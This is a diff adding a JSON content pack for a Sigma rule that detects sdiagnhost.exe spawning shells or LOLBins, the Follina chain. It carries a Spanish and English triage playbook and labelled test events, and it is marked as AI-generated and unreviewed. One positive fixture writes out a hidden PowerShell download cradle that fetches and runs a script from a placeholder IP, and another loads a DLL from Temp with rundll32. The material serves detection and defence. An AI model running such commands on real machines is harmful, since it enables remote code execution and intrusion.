@@ -1,0 +1,130 @@
+{
+  "rule": {
+    "id": "f3d39c45-de1a-4486-a687-ab126124f744",
+    "title": "Sdiagnhost Calling Suspicious Child Process",
+    "level": "high",
+    "status": "test",
+    "author": "Nextron Systems, @Kostastsale",
+    "path": "windows/process_creation/proc_creation_win_sdiagnhost_susp_child.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_sdiagnhost_susp_child.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1036",
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "sdiagnhost.exe, el host de diagnósticos con scripts de Windows, ejecutó un shell, un intérprete de scripts o un LOLBin como PowerShell, cmd, mshta, rundll32 o calc. Es la cadena de procesos que se observa en la explotación de Follina (CVE-2022-30190).",
+      "what_it_detects": "Eventos de creación de procesos donde ParentImage termina en \\sdiagnhost.exe e Image es powershell, pwsh, cmd, mshta, cscript, wscript, taskkill, regsvr32, rundll32 o calc. Se excluyen patrones conocidos de solucionadores de problemas: cmd con 'bits' en CommandLine y powershell con CommandLine terminado en '-noprofile' o '-noprofile -'.",
+      "why_it_matters": "Follina abusa del manejador de URL ms-msdt para que un documento de Office o un enlace inicie la herramienta de diagnóstico, y sdiagnhost.exe ejecuta luego código del atacante. Es ejecución mediante binario firmado como proxy (T1218) y enmascaramiento (T1036), y logra ejecutar código sin macros.",
+      "triage_steps": [
+        "Revise la CommandLine completa del proceso hijo. Busque PowerShell codificado u oculto, descargas remotas, rutas en Temp y rutas de DLL o scripts en carpetas donde el usuario puede escribir.",
+        "Recorra el árbol de procesos hacia arriba: sdiagnhost.exe suele venir después de msdt.exe. Verifique si msdt.exe lo lanzó WINWORD.EXE, EXCEL.EXE, OUTLOOK.EXE, un navegador o explorer.",
+        "Revise la CommandLine de msdt.exe en busca de parámetros ms-msdt como IT_BrowseForFile o PCWDiagnostic con $( ) o contenido codificado.",
+        "Liste los procesos hijos del proceso alertado y las escrituras de archivos en el mismo host +/- 15 minutos, por ejemplo ejecutables o DLL descargados y tareas programadas.",
+        "Revise las conexiones de red del host y del proceso hijo hacia dominios o IP externos nuevos cerca de la hora de la alerta.",
+        "Identifique el documento o enlace que inició la cadena: adjuntos de correo recientes, descargas y archivos de Office abiertos hace poco por el usuario.",
+        "Busque la misma CommandLine, el hash del documento o la URL remota en otros endpoints, y revise alertas previas del usuario y del host."
+      ],
+      "false_positives": [
+        "Solucionadores de problemas integrados de Windows, iniciados por el usuario o por soporte, que ejecutan cmd o PowerShell de formas que los filtros actuales no cubren.",
+        "Paquetes de diagnóstico (.diagcab) de soporte de TI o de proveedores que ejecutan scripts propios mediante sdiagnhost.exe."
+      ],
+      "response_steps": [
+        "Confirme si es malicioso a partir de la cadena de procesos y la línea de comandos. Si es un solucionador iniciado por el usuario con scripts benignos, documéntelo y cierre la alerta.",
+        "Si es malicioso, aísle el endpoint, termine los procesos lanzados y preserve la memoria, el documento que lo inició y los logs relevantes.",
+        "Elimine los archivos descargados y la persistencia, bloquee los hashes, dominios e IP relacionados y ponga en cuarentena el correo de entrega para todos los destinatarios.",
+        "Restablezca las credenciales del usuario si hubo payloads en su sesión, aplique el parche de Follina o deshabilite el protocolo ms-msdt, y luego devuelva el equipo a producción."
+      ],
+      "severity_rationale": "El nivel alto es adecuado porque el host de diagnósticos rara vez lanza estos binarios de forma legítima, y el patrón está muy ligado a la ejecución de código a través de documentos de Office."
+    },
+    "en": {
+      "summary": "sdiagnhost.exe, the Windows Scripted Diagnostics host, started a shell, script host or LOLBin such as PowerShell, cmd, mshta, rundll32 or calc. This is the process chain seen in Follina (CVE-2022-30190) exploitation.",
+      "what_it_detects": "Process creation events where ParentImage ends with \\sdiagnhost.exe and Image is powershell, pwsh, cmd, mshta, cscript, wscript, taskkill, regsvr32, rundll32 or calc. Known troubleshooter patterns are excluded: cmd with 'bits' in CommandLine, and powershell whose CommandLine ends with '-noprofile' or '-noprofile -'.",
+      "why_it_matters": "Follina abuses the ms-msdt URL handler so an Office document or link can launch the diagnostic tool, and sdiagnhost.exe then runs attacker code. It is signed binary proxy execution (T1218) and masquerading (T1036), and it gives code execution without macros.",
+      "triage_steps": [
+        "Read the full CommandLine of the child process. Look for encoded or hidden PowerShell, download cradles, temp-folder paths, or DLL and script paths in user-writable folders.",
+        "Walk the process tree up: sdiagnhost.exe usually follows msdt.exe. Check whether msdt.exe was spawned by WINWORD.EXE, EXCEL.EXE, OUTLOOK.EXE, a browser or explorer.",
+        "Check the msdt.exe CommandLine for ms-msdt parameters such as IT_BrowseForFile or PCWDiagnostic containing $( ) or encoded content.",
+        "List child processes of the flagged process and file writes on the same host within +/- 15 minutes, for example dropped executables, DLLs or scheduled tasks.",
+        "Review network connections from the host and the child process to new external domains or IPs around the alert time.",
+        "Find the document or link that started the chain: recent email attachments, downloads and Office MRU entries for the logged-on user.",
+        "Search for the same CommandLine, document hash or remote URL on other endpoints and check earlier alerts for this user and host."
+      ],
+      "false_positives": [
+        "Built-in Windows troubleshooters that run cmd or PowerShell in ways the existing filters do not cover, started by the user or support staff.",
+        "IT support or vendor diagnostic packages (.diagcab) that run custom scripts through sdiagnhost.exe."
+      ],
+      "response_steps": [
+        "Confirm maliciousness from the parent chain and command line. If it is a user-started troubleshooter with benign scripts, document it and close.",
+        "If malicious, isolate the endpoint, kill the spawned processes and preserve memory, the triggering document and relevant logs.",
+        "Remove dropped files and persistence, block related hashes, domains and IPs, and quarantine the delivery email for all recipients.",
+        "Reset the user's credentials if payloads ran in their session, apply the Follina patch or disable the ms-msdt protocol handler, then return the host to service."
+      ],
+      "severity_rationale": "High fits because the diagnostics host rarely spawns these binaries legitimately, and the pattern is strongly tied to Office-delivered code execution."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "sdiagnhost.exe spawns hidden PowerShell with a download cradle (Follina-style chain from msdt.exe)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\System32\\sdiagnhost.exe",
+          "ParentCommandLine": "C:\\Windows\\System32\\sdiagnhost.exe -Embedding",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.15/p.ps1')\"",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "sdiagnhost.exe launches rundll32 loading a DLL from the user's Temp folder",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\System32\\sdiagnhost.exe",
+          "Image": "C:\\Windows\\System32\\rundll32.exe",
+          "CommandLine": "rundll32.exe C:\\Users\\jperez\\AppData\\Local\\Temp\\upd.dll,DllMain",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "BITS troubleshooter runs cmd to restart the BITS service (excluded by filter_main_cmd_bits)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mlopez",
+          "ParentImage": "C:\\Windows\\System32\\sdiagnhost.exe",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c net start bits",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "Built-in troubleshooter runs PowerShell reading its script from stdin (CommandLine ends with -NoProfile -, excluded)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mlopez",
+          "ParentImage": "C:\\Windows\\System32\\sdiagnhost.exe",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
